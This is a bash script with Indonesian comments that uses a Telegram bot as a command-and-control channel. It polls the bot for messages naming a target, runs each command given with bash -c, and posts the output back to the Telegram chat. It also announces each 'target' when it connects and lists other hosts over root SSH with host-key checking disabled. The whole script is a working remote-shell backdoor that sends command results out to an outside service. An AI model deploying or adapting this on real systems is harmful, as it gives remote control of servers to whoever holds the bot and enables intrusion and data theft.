#!/bin/bash

# Konfigurasi Telegram
BOT_TOKEN="000000000000000000000000000000000000"
CHAT_ID="-000000000"

# Daftar server yang bisa dieksekusi
TARGET_LIST=("wolf1")  # Tambahkan server lain di sini
TARGET_ID="wolf1"  # Gunakan hostname sebagai ID unik

# Fungsi escape karakter agar aman di HTML
escape_html() {
    echo "$1" | sed -e 's/&/\&amp;/g' \
                    -e 's/</\&lt;/g' \
                    -e 's/>/\&gt;/g' \
                    -e "s/'/\&apos;/g" \
                    -e 's/"/\&quot;/g'
}

# Fungsi untuk mengirim hasil ke Telegram dengan format HTML
send_telegram() {
    local message
    message=$(printf "%b" "$1")  # Pastikan karakter spesial tetap terbaca

    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -d chat_id="${CHAT_ID}" \
        --data-urlencode "text=$message" \
        -d parse_mode="HTML" &>/dev/null
}

# Kirim notifikasi saat script dijalankan
send_telegram "<b>Target:</b> <code>$TARGET_ID</code> terhubung."

# Pastikan `jq` terinstall
if ! command -v jq &>/dev/null; then
    send_telegram "<b>Error:</b> <code>jq</code> tidak ditemukan. Instal dengan <code>apt install jq -y</code>."
    exit 1
fi

# Fungsi untuk mendapatkan hostname dari setiap server dalam daftar
get_server_list() {
    local result=""

    for target in "${!TARGET_LIST[@]}"; do
        ip="${TARGET_LIST[$target]}"
        hostname=$(ssh -o StrictHostKeyChecking=no root@$ip "hostname" 2>/dev/null || echo "Unknown")
        result+="$target ? $hostname ($ip)\n"
    done

    echo -e "$result"
}

# Loop untuk cek perintah dari Telegram
LAST_UPDATE_ID=0
while true; do
    # Ambil pesan terbaru dari Telegram
    RESPONSE=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${LAST_UPDATE_ID}")

    # Ambil update_id terbaru
    UPDATE_ID=$(echo "$RESPONSE" | jq -r '.result[-1].update_id')
    MESSAGE=$(echo "$RESPONSE" | jq -r '.result[-1].message.text' | tr -d '\r')

    # Ambil target dan perintah dengan `cut`
    SELECTED_TARGET=$(echo "$MESSAGE" | awk '{print $1}')
    COMMAND=$(echo "$MESSAGE" | cut -d' ' -f2- | sed 's/^[[:space:]]*//')

    # Debugging log
    echo "Update ID: $UPDATE_ID, Pesan: $MESSAGE" >> /tmp/bot_debug.log

    # Jika tidak ada perintah baru, lanjutkan loop
    if [[ "$UPDATE_ID" == "null" || "$UPDATE_ID" -le "$LAST_UPDATE_ID" ]]; then
        sleep 1
        continue
    fi

    LAST_UPDATE_ID=$((UPDATE_ID + 1))

    # Jika perintah adalah "list", kirim daftar server yang bisa dieksekusi
    if [[ "$SELECTED_TARGET" == "list" ]]; then
        SERVER_LIST=$(get_server_list)
        send_telegram "<b>Daftar Server yang Aktif:</b>\n<pre>$(escape_html "$SERVER_LIST")</pre>"
        continue
    fi

    # Jika perintah adalah "help", kirim daftar command yang bisa dijalankan
    if [[ "$SELECTED_TARGET" == "help" ]]; then
        AVAILABLE_COMMANDS=$(compgen -c | sort | tr '\n' ' ' | fold -s -w 60)
        send_telegram "<b>Daftar Perintah yang Bisa Dijalankan:</b>\n<pre>$AVAILABLE_COMMANDS</pre>"
        continue
    fi

    # Jika target cocok, jalankan perintah
    if [[ "$SELECTED_TARGET" == "$TARGET_ID" ]]; then
        if [[ -n "$COMMAND" ]]; then
            OUTPUT=$(bash -c "$COMMAND" 2>&1 | tr -d '\r')

            # Jika output kosong, tambahkan "[No Output]"
            if [[ -z "$OUTPUT" ]]; then
                OUTPUT="[No Output]"
            fi

            # Potong output jika terlalu panjang untuk Telegram
            if [[ ${#OUTPUT} -gt 4000 ]]; then
                OUTPUT="${OUTPUT:0:4000}...\n(Output dipotong)"
            fi

            send_telegram "<b>Target:</b> <code>$TARGET_ID</code>\n<b>Command:</b> <code>$(escape_html "$COMMAND")</code>\n<b>Output:</b>\n<pre>$(escape_html "$OUTPUT")</pre>"
        else
            send_telegram "<b>Error:</b> Perintah kosong!"
        fi
    fi

    sleep 1
done
